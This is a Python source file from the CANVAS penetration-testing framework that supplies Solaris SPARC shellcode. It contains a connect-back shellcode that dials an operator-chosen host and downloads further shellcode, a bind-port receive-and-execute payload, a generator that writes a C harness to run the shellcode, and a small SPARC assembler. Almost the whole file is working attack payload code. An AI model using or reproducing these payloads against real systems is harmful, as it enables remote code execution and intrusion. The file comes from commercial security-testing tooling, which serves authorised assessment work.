#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

"""
solarisshell.py

Includes SOLARIS SPARC decoder and shellcode

"""


import socket
from exploitutils import *
import struct

#this shellcode connects back to a tcp port - loads the 
#connected socket in %g4
#132 bytes
solarissparcshellcode= "\x40\x00\x00\x01\x01\x00\x00\x00"
solarissparcshellcode+="\x90\x10\x20\x02\x82\x10\x20\xe6"
solarissparcshellcode+="\x92\x10\x20\x02\x94\x10\x20\x00"
solarissparcshellcode+="\x96\x10\x20\x00\x98\x10\x20\x02"
solarissparcshellcode+="\x91\xd0\x20\x08\x88\x10\x00\x08"
solarissparcshellcode+="\x92\x03\xe0\x7c\x94\x10\x20\x10"
solarissparcshellcode+="\x82\x10\x20\xeb\x91\xd0\x20\x08"
solarissparcshellcode+="\x90\x10\x00\x04\x82\x10\x20\xed"
solarissparcshellcode+="\x92\x23\xe4\x00\x94\x10\x23\x00"
solarissparcshellcode+="\x96\x10\x20\x00\x91\xd0\x20\x08"
solarissparcshellcode+="\x8a\x18\x40\x01\x82\x21\x7f\x39"
solarissparcshellcode+="\xa0\x01\x60\x03\xe0\x23\xe0\x7c"
solarissparcshellcode+="\xe0\x23\xe0\x80\x90\x03\xe0\x7c"
solarissparcshellcode+="\x92\x03\xe0\x7c\x91\xd1\x60\x08"
solarissparcshellcode+="\xa0\x23\xe4\x00\x9f\xc4\x00\x00"
solarissparcshellcode+="\x01\x00\x00\x00\x00\x02\x44\x44"
solarissparcshellcode+="\x65\x01\xa8\xc0"


#returns a binary version of the string

def getRecvExecShellcode(port):
        
        if int(port) > 0xfff:
            raise ValueError, "please use a bind port number lower than 4095."

        recvexec="\x86\x22\xfe\x70"+\
                "\x98\x1f\xc0\x1f"+\
                "\x82\x23\x3f\xd7"+\
                "\x82\x20\x60\x28"+\
                "\x84\x23\x37\xd8"+\
                "\x84\x20\xa0\x28"+\
                "\x90\x10\x80\x01"+\
                "\x82\x23\x3f\xd0"+\
                "\x91\xd0\x20\x08"+\
                "\x82\x23\x3f\xc0"+\
                "\x82\x20\x60\x28"+\
                "\x84\x23\x37\xd8"+\
                "\x84\x20\xa0\x28"+\
                "\x90\x10\x80\x01"+\
                "\x82\x23\x3f\xd0"+\
                "\x91\xd0\x20\x08"+\
                "\x90\x23\x3f\xfe"+\
                "\x92\x23\x3f\xfe"+\
                "\x94\x22\x60\x02"+\
                "\x96\x22\x60\x02"+\
                "\x82\x23\x3e\x70"+\
                "\x82\x20\x60\xaa"+\
                "\x98\x23\x3f\xff"+\
                "\x91\xd0\x20\x08"+\
                "\x84\x22\x3f\xfe"+\
                "\x98\x1f\xc0\x1f"+\
                "\xa0\x23\x3f\xfe"+\
                "\xa1\x2c\x20\x10"+\
                "\x90\x14"+struct.pack(">h", (port | 0x2000))+\
                "\x92\x1f\xc0\x1f"+\
                "\x9c\x0b\xbf\xf8"+\
                "\xd0\x3b\xbf\xe0"+\
                "\x92\x23\xa0\x20"+\
                "\x90\x20\xa0\x02"+\
                "\x94\x23\x3f\xf0"+\
                "\x82\x23\x3e\x70"+\
                "\x82\x20\x60\xa8"+\
                "\x91\xd0\x20\x08"+\
                "\x98\x1f\xc0\x1f"+\
                "\x90\x20\xa0\x02"+\
                "\x92\x23\x3f\xfb"+\
                "\x82\x23\x3e\x70"+\
                "\x82\x20\x60\xa7"+\
                "\x91\xd0\x20\x08"+\
                "\x98\x1f\xc0\x1f"+\
                "\x90\x20\xa0\x02"+\
                "\x92\x1f\xc0\x1f"+\
                "\x94\x1f\xc0\x1f"+\
                "\x82\x23\x3e\x70"+\
                "\x82\x20\x60\xa6"+\
                "\x91\xd0\x20\x08"+\
                "\x98\x1f\xc0\x1f"+\
                "\x92\x20\xff\xf8"+\
                "\x94\x23\x3c\xe0"+\
                "\x82\x23\x3e\x70"+\
                "\x82\x20\x60\xa3"+\
                "\x96\x1f\xc0\x1f"+\
                "\x84\x22\x3f\xfe"+\
                "\x91\xd0\x20\x08"+\
                "\x81\xd8\xe0\x08"+\
                "\x81\xc0\xe0\x08"+\
                "\x98\x1f\xc0\x1f"
        return recvexec
                
def binstring(instring):
    result=""
    #erase all whitespace
    tmp=instring.replace(" ","")
    tmp=tmp.replace("\n","")
    tmp=tmp.replace("\t","")
    if len(tmp) % 2 != 0:
        print "tried to binstring something of illegal length"
        return ""

    while tmp!="":
        two=tmp[:2]
        #account for 0x and \x stuff
        if two!="0x" and two!="\\x":
            result+=chr(int(two,16))
        tmp=tmp[2:]

    return result


loopme=binstring("92126328  7fffffff  92126328")



    
def getConnectBackStage1(host,port):
    """
    Connects back to a host, then downloads 0x300 more bytes of shellcode
    """
    
    newip=socket.gethostbyname(host)
    dotted=newip.split(".")
    if len(dotted) != 4:
        print "Sorry, not able to split %s into 4 parts" % hostname
        return ""
    binIP=""
    for dot in dotted:
        binIP+=chr(int(dot))

    binPORT=chr((int(port)&0xff00) >> 8)+chr(int(port) & 0xff)
    
    newshellcode=solarissparcshellcode.replace("\x00\x02\x44\x44\x65\x01\xa8\xc0","\x00\x02"+binPORT+binIP)
    #enable following line for debugging
    #newshellcode=loopme+newshellcode
    return newshellcode

def generateCtester(host,port,outfile):
    """
    Writes a little c program into outfile for use testing the shellcode
    python
    import sys
    sys.path.append(".")
    from shellcode import solarisshell
    solarisshell.generateCtester("192.168.1.103",5555,"out.c")

    """
    shellcode=getConnectBackStage1(host,port)
    f=open(outfile,"wb")
    start="""
    main()
    {  
    unsigned char * p;
    unsigned char buffer[]="""
    start+=cprint(shellcode)+";\n"
    start+="""
    p=buffer; ((void(*)())(p)) ();
    }
    
    """
    f.write(start)
    f.close()
    return


codecache={}
codecache["retl"]=big_order(0x81c3e008L)
codecache["mov 0x8f, %g1"]=big_order(0x8210208fL)
codecache["mov 143, %g1"]=big_order(0x8210208fL)
codecache["ta 8"]=big_order(0x91d02008L)
codecache["cmp %g0, %o0"]=big_order(0x80a00008L)
#codecache["bne +56"]=0x1280000e
codecache["nop"]=   big_order(0x01000000L)
codecache["mov %o1, %l0"]=big_order(0xa0100009L)
#codecache["ld  [ %l0 ], %g1"]=0xc2042000 04200000
#codecache["ld  [ %l0 + 4], %g1"]=
#codecache["ld  [ %l0 + 8], %g1"]=
#codecache["ld  [ %l0 + 0xc ], %g1"]=
#codecache["ld  [ %l0 + 0x10 ], %g1"]=
#codecache["ld  [ %l0 + 0x14 ], %g1"]=
#codecache["ld  [ %l0 + 0x18 ], %g1"]=

codecache["mov 1, %g1"]=big_order(0x82102001L)
codecache["mov %g0, %o0"]=big_order(0x90100000L)
codecache["mov %o1, %l5"]=big_order(0xaa100009L)
codecache["mov %l5, %l0"]=big_order(0xa0100015L)
codecache["cmp %g0, %o1"]=big_order(0x80a00009L)
knownasm=["bne","be","ld"]

def rawasm(line):
    """
    handle any opcodes we can actual compile
    """
    opcode=line.split(" ")[0]
    if opcode=="bne":
        size=int(line.split(" ")[1])/4
        return big_order(0x12800000+size)
    elif opcode=="be":
        size=int(line.split(" ")[1])/4
        return big_order(0x02800000+size)

    elif opcode=="ld":
        lddict={"%g1": 0xc2, "%o0": 0xd0, "%o1": 0xd2, "%o2": 0xd4, "%o3": 0xd6, "%o4": 0xd8, "%o5": 0xda}
        prefix=lddict[line[-3:]]
        if line.split(" ")[2]=="%l0":
            midfix=0x0420
            if line.split(" ")[3]=="]":
                size=0
            else:
                size=int(line.split(" ")[4])
            return (big_order((prefix<<24)+(midfix<<8)+size))
    return ""

def asm(code):
    """
    A assembler for sparc asm - a bit silly right now, but makes life easier to read
    """
    ret=""
    lines=code.split("\n")
    for line in lines:
        #get rid of comments
        line=line.split("!")[0]
        #remove leading and trailing whitespace
        line=line.strip()
        if line[:2]=="/*":
            continue
        if line=="":
            continue
        #replace double spaces with one
        line=line.replace("  "," ")
        #try to actually assemble it
        if line.split(" ")[0] in knownasm:
            val=rawasm(line)
            if val!="":
                ret+=val
                continue
        #now look for it in the cache
        if codecache.has_key(line):
            ret+=codecache[line]
        else:
            print "Assembler error - did not have line: %s"%line
            
    return ret
    
